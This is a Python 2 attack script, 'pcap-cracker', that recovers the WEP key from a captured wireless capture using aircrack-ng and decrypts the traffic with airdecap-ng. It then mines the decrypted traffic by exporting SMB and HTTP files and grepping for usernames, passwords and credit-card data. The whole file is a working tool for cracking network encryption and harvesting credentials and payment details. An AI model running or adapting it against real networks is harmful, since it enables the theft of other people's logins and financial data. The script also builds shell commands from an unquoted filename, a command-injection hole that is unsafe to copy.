#!/usr/bin/python

# -------------------------------------------------------------------------------------
#      PYTHON UTILITY FILE TO CRACK ENCRYPTED .PCAP FILES CAPTURED BY WIRESHARK
#                BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Load any required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Show a universal header.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print " ____     ____      _      ____     ____   ____       _       ____   _  __  _____   ____   "
print "|  _ \   / ___|    / \    |  _ \   / ___| |  _ \     / \     / ___| | |/ / | ____| |  _ \  "
print "| |_) | | |       / _ \   | |_) | | |     | |_) |   / _ \   | |     | ' /  |  _|   | |_) | "
print "|  __/  | |___   / ___ \  |  __/  | |___  |  _ <   / ___ \  | |___  | . \  | |___  |  _ <  "
print "|_|      \____| /_/   \_\ |_|      \____| |_| \_\ /_/   \_\  \____| |_|\_\ |_____| |_| \_\ "
print "                                                                                           "
print "                 BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)                     "

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Conduct routine and simple tests on supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

filename = sys.argv[1]

if os.path.exists(filename) == 0:
    print "\nFile " + filename + " was not found, did you spell it correctly?"
    exit(True)

if os.geteuid() != 0:
    print "\nPlease run this python script as root..."
    exit(True)

if len(sys.argv) < 2:
    print "\nUse the command python pcap-cracker.py wiresharkfile.pcapng\n"
    exit(True)

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Check all required dependencies are installed on the system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

install = False

print "\nChecking dependencies..."

if os.path.isfile('/usr/bin/pcapfix') != 1:
    print "pcapfix - missing"
    install = True

if os.path.isfile("/usr/sbin/airmon-ng") != 1:
    print "aircrack-ng - missing"
    install = True

if os.path.isfile('/usr/bin/tshark') != 1:
    print "tshark - missing"
    install = True

if os.path.isfile('/usr/bin/editcap') != 1:
    print "editcap - missing"
    install = True

if install == False:
    print "All required dependencies are pre-installed...\n"
else:
    print "Install any missing dependencies before you begin...\n"
    exit (True)

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Check type of wireshark file and adjust as required (pcapng -->  pcap).
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print "Filename          : " + filename
oldfile = filename
newfiletype = filename[:-2]
typetest = filename[-6:]
print "File Format       : " + typetest

if typetest == "pcapng":
    print "Crack Status      : Converting file format..."
    os.system("editcap -F pcap " + filename + " " + newfiletype + " > /dev/null")
    filename = filename[:-2]
    print "New Filename      : " + filename

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Sometimes captured .PCAP files cut off or are corrupted in other ways.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("pcapfix -d " + filename + " -o Fixerror.pcap > /dev/null")

if os.path.isfile('./Fixerror.pcap') !=0:
    os.rename(filename, "Oldpcapfile.pcap")
    os.rename("Fixerror.pcap", filename)
    print "Crack Status      : Fixing file errors.." + filename
    print "Orginal Renamed   : Oldpcapfile.pcap" 

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Extract the SSID from the .PCAP file.    
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print ""
os.system("tcpdump -ennr " + filename + " '(type mgt subtype beacon)' | awk '{print $13}' | sed 's/[()]//g;s/......//' | sort | uniq > SSID.txt")
print ""

with open('SSID.txt', 'r') as myfile:
    ssid = myfile.read().replace('\n', '')

os.remove('./SSID.txt')
ssid = "00:" + ssid

if ssid == "00:":
    print "Empty SSID        : Error..."
    exit (True)
else:
    print "Service Set Id.   : " + ssid

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Extract the WEP key fom the .PCAP file using the SSID
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("aircrack-ng -b " + ssid + " " + filename + " > Key.txt")
os.system("grep -o '![^\"]*' Key.txt > Key2.txt")
os.system("cat Key2.txt | sed 's/[^a-z  A-Z 0-1 :]//g' > Key3.txt")
os.system("cat Key3.txt | tr -d ' \t\n\r' > WepKey.txt")
os.remove('./Key.txt')
os.remove('./Key2.txt')
os.remove('./Key3.txt')

with open('WepKey.txt', 'r') as myfile:
    wep = myfile.read().replace('\n', '')

os.remove("./WepKey.txt")
print "Wired Privacy Key : " + wep

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Use the WEP key to creat a cracked version of the .PCAP file.  
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

os.system("airdecap-ng -w " + wep + " "+ filename +" " + "> /dev/null")
filename2 = filename[:-5]
filename2 = filename2 + "-dec.pcap"
os.rename(filename2, "Cracked.pcap")
print "Cracked File      : Cracked.pcap"

# -------------------------------------------------------------------------------------
# AUTHOR: Terence Broadbent                                                    
# CONTRACT: SME                                                               
# Version: 1.0                                                                
# Details: Now conduct some reconissance on the cracked file.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print "Crack Status      : Extracting Data...\n"
os.system("tshark -nr Cracked.pcap --export-objects smb,Smbfolder > /dev/null 2>/dev/null")
os.system("tshark -nr Cracked.pcap --export-objects http,Httpfolder > /dev/null 2>/dev/null")
os.system("ngrep -q -I Cracked.pcap | grep -i username > Username.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i password > Password.txt")
os.system("ngrep -q -I Cracked.pcap | grep -i credit > Creditcard.txt")
os.system("ls -p -I pcap-cracker.py -I " + filename + " -I " + oldfile)
exit (False)

#Eof
